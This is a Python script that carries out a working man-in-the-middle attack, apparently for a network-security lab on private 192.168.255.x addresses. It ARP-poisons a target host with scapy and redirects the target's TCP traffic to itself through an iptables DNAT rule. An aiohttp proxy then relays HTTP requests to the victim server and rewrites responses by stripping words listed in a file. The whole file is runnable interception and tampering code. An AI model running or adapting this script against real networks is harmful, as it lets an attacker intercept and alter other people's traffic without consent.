from aiohttp import web
import aiohttp
from scapy.layers.l2 import arpcachepoison
from scapy.config import conf
from subprocess import call
import os
import threading
import time

target = os.environ.get("TARGET") or "192.168.255.3"
victim = os.environ.get("VICTIM") or "192.168.255.2"
my_mac = os.environ.get("MAC_ADDRESS") or "aa:aa:aa:aa:aa:a2"
my_ip = os.environ.get("IP_ADDRESS") or "192.168.255.4"
bad_word_fname = os.environ.get("BAD_WORDS") or "bad-words.txt"

conf.verf = False

methods = ['get', 'post', 'put', 'patch', 'head', 'delete']
base_url = 'http://192.168.255.2:80/'

with open(bad_word_fname, "r") as f:
    bad_word_list = [w.encode("utf-8") for w in f.read().split("\n")]

hop_by_hop_headers = {"Connection",
                      "Keep-Alive",
                      "Proxy-Authenticate",
                      "Proxy-Authorization",
                      "TE",
                      "Trailers",
                      "Transfer-Encoding",
                      "Upgrade",
                      "Content-Length"}


def setup_iptables(target_ip, self_interface, self_ip, self_port):
    command = f"iptables -A PREROUTING -t nat -i {self_interface} -p tcp --src {target_ip} -j DNAT --to {self_ip}:{self_port}"
    call(command.split(" "))


def restore_iptables(target_ip, self_interface, self_ip, self_port):
    command = f"iptables -D PREROUTING -t nat -i {self_interface} -p tcp --src {target_ip} -j DNAT --to {self_ip}:{self_port}"
    call(command.split(" "))


def setup_mitm():
    conf.verb = False
    print("[*] Starting mitm thread...")
    try:
        arp_spoofing = threading.Thread(
            target=arpcachepoison, args=(target, victim, 2))
        arp_spoofing.start()
        setup_iptables(target, "eth0", my_ip, 80)
        time.sleep(24 * 60 * 60)
    except KeyboardInterrupt:
        print("Closing")
    finally:
        restore_iptables(target, "eth0", my_ip, 80)


async def handle(request: web.BaseRequest):
    print("[*] Got request...")
    method = request.method
    request_uri = request.match_info.get('request_uri', '/')
    body = await request.read()
    headers = request.headers
    async with aiohttp.ClientSession() as session:
        async with session.request(method=method, url=base_url+request_uri, data=body, headers=headers) as response:
            _body = await response.read()
            for word in bad_word_list:
                _body = _body.replace(word, b" ")
            status = response.status
            _headers = {}
            for header in response.headers:
                if not header in hop_by_hop_headers:
                    _headers[header] = response.headers[header]
            return web.Response(status=status, body=_body, headers=_headers)


def main():
    print("[*] Starting interceptor")
    mitm_thread = threading.Thread(target=setup_mitm, args=())
    mitm_thread.start()
    app = web.Application()
    app.add_routes([getattr(web, method)(
        r'/{request_uri:.*}', handle) for method in methods])
    web.run_app(app, host=my_ip, port=80)


if __name__ == '__main__':
    main()
